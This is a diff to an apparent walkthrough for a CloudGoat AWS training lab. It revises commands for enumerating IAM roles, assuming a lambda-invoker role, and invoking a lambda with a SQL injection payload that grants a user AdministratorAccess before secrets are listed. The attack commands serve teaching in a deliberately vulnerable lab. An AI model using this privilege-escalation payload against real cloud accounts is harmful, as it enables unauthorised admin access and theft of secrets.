@@ -15,7 +15,7 @@
     # This command will list all the roles in your account, one of which should be assumable. 
     aws --profile bilbo --region us-east-1 iam list-roles | grep cg-
     # This command will list all policies for the target role
-    aws --profile bilbo --region us-east-1 list-attached-user-policies --user-name [cg-target-user]
+    aws --profile bilbo --region us-east-1 iam list-role-policies --role-name [cg-target-role]
     # This command will get you credentials for the cloudgoat role that can invoke lambdas.
     aws --profile bilbo --region us-east-1 sts assume-role --role-arn [cg-lambda-invoker_arn] --role-session-name [whatever_you_want_here]
 
@@ -41,7 +41,10 @@ we'll see what an exploit looks like in the next step.
 5. Invoke the role applier lambda function, passing the name of the bilbo user and the injection payload. 
 
     ```bash
+    # The following command will send a SQL injection payload to the lambda function
     aws --profile assumed_role --region us-east-1 lambda invoke --function-name [policy_applier_lambda_name] --cli-binary-format raw-in-base64-out --payload '{"policy_names": ["AdministratorAccess'"'"' --"], "user_name": [bilbo_user_name_here]}' out.txt
+    # cat the results to confirm everything is working properly
+    cat out.txt
     ```
 6. Now that Bilbo is an admin, use credentials for that user to list secrets from secretsmanager. 
 
